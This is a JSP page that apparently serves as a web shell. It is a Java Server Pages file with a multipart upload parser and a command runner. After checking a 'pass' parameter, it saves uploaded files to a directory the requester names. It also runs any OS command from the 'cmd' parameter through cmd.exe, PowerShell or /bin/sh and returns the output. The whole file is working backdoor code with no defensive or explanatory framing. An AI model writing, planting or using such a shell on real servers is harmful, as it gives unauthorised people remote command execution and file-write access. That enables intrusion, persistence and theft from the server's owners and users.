<%@page import="java.io.BufferedReader,
                java.io.IOException,
                java.io.InputStreamReader,
                java.io.IOException,
                java.io.File,
                java.io.FileOutputStream,
                java.io.OutputStream,
                java.io.ByteArrayOutputStream,
                javax.servlet.ServletInputStream,
                java.util.Hashtable,
                java.util.StringTokenizer"
%>

<%!

    public class Upload {
        private final int ONE_MB=1024*1024*1;


        public Hashtable parseData(ServletInputStream data,
                                   String boundary,
                                   String saveInDir)
                throws IllegalArgumentException, IOException
        {
            return processData(data, boundary, saveInDir);
        }

        public Hashtable parseData(ServletInputStream data,
                                   String boundary)
                throws IllegalArgumentException, IOException
        {
            return processData(data, boundary, null);
        }


        private Hashtable processData(ServletInputStream is,
                                      String boundary,
                                      String saveInDir)
                throws IllegalArgumentException, IOException
        {
            if (is == null)
                throw new IllegalArgumentException("InputStream");

            if (boundary == null || boundary.trim().length() < 1)
                throw new IllegalArgumentException("boundary");

            boundary = "--" + boundary;


            StringTokenizer stLine, stFields;
            FileInfo fileInfo;
            Hashtable dataTable = new Hashtable(5);
            String line, field, paramName;
            boolean saveFiles=(saveInDir != null && saveInDir.trim().length() > 0);
            boolean isFile;

            if (saveFiles)
            {
                File f = new File(saveInDir);
                f.mkdirs();
            }


            line = getLine(is);
            if (line == null || !line.startsWith(boundary))
                throw new IOException("Boundary not found;"
                        +" boundary = " + boundary
                        +", line = "    + line);


            while (line != null)
            {
                if (line == null || !line.startsWith(boundary))
                    return dataTable;


                line = getLine(is);
                if (line == null)
                    return dataTable;


                stLine = new StringTokenizer(line, ";\r\n");
                if (stLine.countTokens() < 2)
                    throw new IllegalArgumentException("Bad data in second line");


                line = stLine.nextToken().toLowerCase();
                if (line.indexOf("form-data") < 0)
                    throw new IllegalArgumentException("Bad data in second line");


                stFields = new StringTokenizer(stLine.nextToken(), "=\"");
                if (stFields.countTokens() < 2)
                    throw new IllegalArgumentException("Bad data in second line");


                fileInfo = new FileInfo();
                stFields.nextToken();
                paramName = stFields.nextToken();


                isFile = false;
                if (stLine.hasMoreTokens())
                {
                    field    = stLine.nextToken();
                    stFields = new StringTokenizer(field, "=\"");
                    if (stFields.countTokens() > 1)
                    {
                        if (stFields.nextToken().trim().equalsIgnoreCase("filename"))
                        {
                            fileInfo.setName(paramName);
                            String value = stFields.nextToken();
                            if (value != null && value.trim().length() > 0)
                            {
                                fileInfo.setClientFileName(value);
                                isFile = true;
                            }
                            else
                            {
                                line = skipLines(4, is);
                                continue;
                            }
                        }
                    }
                    else
                    if (field.toLowerCase().indexOf("filename") >= 0)
                    {
                        line = skipLines(4, is);
                        continue;
                    }
                }

                boolean skipBlankLine = true;
                if (isFile)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;

                    if (line.trim().length() < 1)
                        skipBlankLine = false;
                    else
                    {
                        stLine = new StringTokenizer(line, ": ");
                        if (stLine.countTokens() < 2)
                            throw new IllegalArgumentException("Bad data in third line");

                        stLine.nextToken(); // Content-Type
                        fileInfo.setFileContentType(stLine.nextToken());
                    }
                }


                if (skipBlankLine)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;
                }


                if (!isFile)
                {
                    line = getLine(is);
                    if (line == null)
                        return dataTable;

                    dataTable.put(paramName, line);
                    line = getLine(is);

                    continue;
                }

                try
                {
                    OutputStream os = null;
                    String path     = null;
                    if (saveFiles)
                        os = new FileOutputStream(path = getFileName(saveInDir,
                                fileInfo.getClientFileName()));
                    else
                        os = new ByteArrayOutputStream(ONE_MB);


                    boolean readingContent = true;
                    byte b[] = new byte[2 * ONE_MB], b2[] = null;
                    int read;

                    while (readingContent)
                    {
                        if ((read = is.readLine(b, 0, b.length)) == -1)
                        {
                            line = null;
                            break;
                        }

                        if (read < 3) // < 3 means CR and LF or just LF
                        {
                            b2 = new byte[read];
                            System.arraycopy(b, 0, b2, 0, b2.length);
                            if ((read = is.readLine(b, 0, b.length)) == -1)
                            {
                                line = null;
                                break;
                            }
                        }

                        if (compareBoundary(boundary, b))
                        {
                            line = new String(b, 0, read);
                            break;
                        }
                        else
                        if (b2 != null) // Prev line was not a boundary line
                        {
                            os.write(b2);
                            b2 = null;
                        }

                        os.write(b, 0, read);
                        os.flush();
                    }

                    os.close();
                    b  = null;

                    if (!saveFiles)
                    {
                        ByteArrayOutputStream baos = (ByteArrayOutputStream)os;
                        fileInfo.setFileContents(baos.toByteArray());
                    }
                    else
                    {
                        fileInfo.setFile(new File(path));
                        os = null;
                    }

                    dataTable.put(paramName, fileInfo);
                }
                catch (IOException e) { throw e; }
            }

            return dataTable;
        }

        // Compares boundary string to byte array
        private boolean compareBoundary(String boundary, byte ba[])
        {
            if (boundary == null || ba == null)
                return false;

            for (int i=0; i < boundary.length(); i++)
                if ((byte)boundary.charAt(i) != ba[i])
                    return false;

            return true;
        }

        private synchronized String getLine(ServletInputStream sis)
                throws IOException
        {
            byte   b[]  = new byte[1024];
            int    read = sis.readLine(b, 0, b.length), index;
            String line = null;

            if (read != -1)
            {
                line = new String(b, 0, read);

                if ((index = line.indexOf('\n')) >= 0)
                    line   = line.substring(0, index-1);
            }

            b = null;
            return line;
        }

        private String getFileName(String dir, String fileName)
                throws IllegalArgumentException
        {
            String path = null;

            if (dir == null || fileName == null)
                throw new IllegalArgumentException("dir or fileName is null");

            int   index = fileName.lastIndexOf('/');
            String name = null;
            if (index >= 0)
                name = fileName.substring(index + 1);
            else
                name = fileName;

            index = name.lastIndexOf('\\');
            if (index >= 0)
                fileName = name.substring(index + 1);

            path = dir + File.separator + fileName;
            if (File.separatorChar == '/')
                return path.replace('\\', File.separatorChar);
            else
                return path.replace('/',  File.separatorChar);
        }

        private String skipLines(int numberOfLines, ServletInputStream sis)
                throws IOException
        {
            String line = null;
            for (int i = 0; i < numberOfLines; i++) {
                line = getLine(sis);
            }
            return line;
        }
    }

    public class FileInfo {
        private String name     = null,
                clientFileName  = null,
                fileContentType = null;
        private byte[] fileContents    = null;
        private File   file            = null;
        private StringBuffer sb = new StringBuffer(100);

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public String getClientFileName() {
            return clientFileName;
        }

        public void setClientFileName(String clientFileName) {
            this.clientFileName = clientFileName;
        }

        public String getFileContentType() {
            return fileContentType;
        }

        public void setFileContentType(String fileContentType) {
            this.fileContentType = fileContentType;
        }

        public byte[] getFileContents() {
            return fileContents;
        }

        public void setFileContents(byte[] fileContents) {
            this.fileContents = fileContents;
        }

        public File getFile() {
            return file;
        }

        public void setFile(File file) {
            this.file = file;
        }

        public StringBuffer getSb() {
            return sb;
        }

        public void setSb(StringBuffer sb) {
            this.sb = sb;
        }
    }

    public enum Attributes {

        OS_VERSION("os.version"),
        OS_NAME("os.name"),
        OS_ARCH("os.arch"),
        JAVA_HOME("java.home"),
        JAVA_VENDOR("java.vendor"),
        JAVA_VERSION("java.version"),
        USER_DIR("user.dir"),
        USER_HOME("user.home"),
        USER_NAME("user.name");

        private String value = null;

        Attributes(String s) {
            this.value = s;
        }

        public String value() {
            return value;
        }
    }

    public static class Command {
        public static final String WIN_CMD[] = {"cmd", "/C"};
        public static final String WIN_POWER[] = {"cmd", "/C", "powershell", "-nologo", "-Command"};
        public static final String BASH[]    = {"/bin/sh", "-c"};
        private static final String IPCONFIG = "ipconfig /all";
        private static final String IFCONFIG = "/sbin/ifconfig -a";
        private static final String END_OF_POWER_SHELL_COMMAND = "---end-of-script---";
        public static final String WDIR_LIST = "dir";
        public static final String LDIR_LIST = "ls -la";

        public static String getOS() {
            return System.getProperty(Attributes.OS_NAME.value()).toLowerCase();
        }

        public static String ipconfig() {
            String command = (getOS().startsWith("windows")) ? IPCONFIG : IFCONFIG;
            return runCommand(command);
        }

        public static String runCommand(String command) {
            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_CMD : BASH;

            return runCommand(shell, command);
        }

        public static String runPowerCommand(String command) {
            String os = System.getProperty(Attributes.OS_NAME.value()).toLowerCase();

            String shell[] = (os.startsWith("windows")) ? WIN_POWER : BASH;
            String cmd = "\"& { "+command+";echo  \"---end-of-script---\"; }\"";
            return runCommand(shell, cmd);
        }

        public static String listDir(String path) {
            String command = (getOS().startsWith("windows")) ? WDIR_LIST : LDIR_LIST;
            command += " " + path;
            return runCommand(command);
        }

        public static String runCommand(String shell[], String command) {
            String cmd[] = new String[shell.length + 1];
            System.arraycopy(shell, 0, cmd, 0, shell.length);
            cmd[cmd.length - 1] = command;

            BufferedReader bufferedReader = null;
            InputStreamReader inputStreamReader = null;
            StringBuffer stringBuffer = null;

            try {
                Process process   = Runtime.getRuntime().exec(cmd);
                inputStreamReader = new InputStreamReader(process.getInputStream());
                bufferedReader    = new BufferedReader(inputStreamReader);
                stringBuffer      = new StringBuffer();
                String line;

                while ((line = bufferedReader.readLine()) != null && !line.equals("---end-of-script---")) {
                    if (line.length() > 0) {
                        stringBuffer.append(line);
                        stringBuffer.append('\n');
                    }
                }
            } catch (IOException ex) {
            } finally {

                try {
                    inputStreamReader.close();
                    bufferedReader.close();
                } catch (IOException e) {}
            }
            return stringBuffer.toString();
        }
    }
%>


<%
if(request.getParameter("pass")!= null &&
    request.getParameter("pass").equals(application.getInitParameter("pass")))
{
    String method = request.getMethod();

    if ("POST".equalsIgnoreCase(method))
    {
        String contentType = request.getContentType().toLowerCase();

        if(contentType != null && contentType.startsWith("multipart"))
        {
            String filePath = null;
            String boundary;
            int bStart = 0;

            if (request.getParameter("filePath") != null)
            {
                filePath = request.getParameter("filePath");
            } else {
                String realPath = application.getRealPath(request.getRequestURI());
                if (realPath != null) {
                    File f = new File(realPath).getParentFile();
                    //This is a hack needed for tomcat
                    while (f != null && !f.exists())
                        f = f.getParentFile();
                    if (f != null)
                        filePath = f.getAbsolutePath();
                }
                if (filePath == null) {
                    filePath = new File(".").getAbsolutePath();
                }
            }
            bStart          = contentType.lastIndexOf("oundary=");
            boundary        = contentType.substring(bStart + 8);
            Upload fileUpload = new Upload();
            Hashtable hashtable = fileUpload.parseData(request.getInputStream(), boundary, filePath);
            out.println("File uploaded to: "+ filePath);
            out.println(Command.listDir(filePath));
        }
    }
    else if ("GET".equalsIgnoreCase(method))
    {
        String cmd = request.getParameter("cmd");
        String power = request.getParameter("power");
        if ((cmd != null) && ((power != null) && (power.toLowerCase().equals("true"))))
        {
            out.print(Command.runPowerCommand(cmd));
        } else if (cmd != null) {
            out.print(Command.runCommand(cmd));
        }
    }
}
%>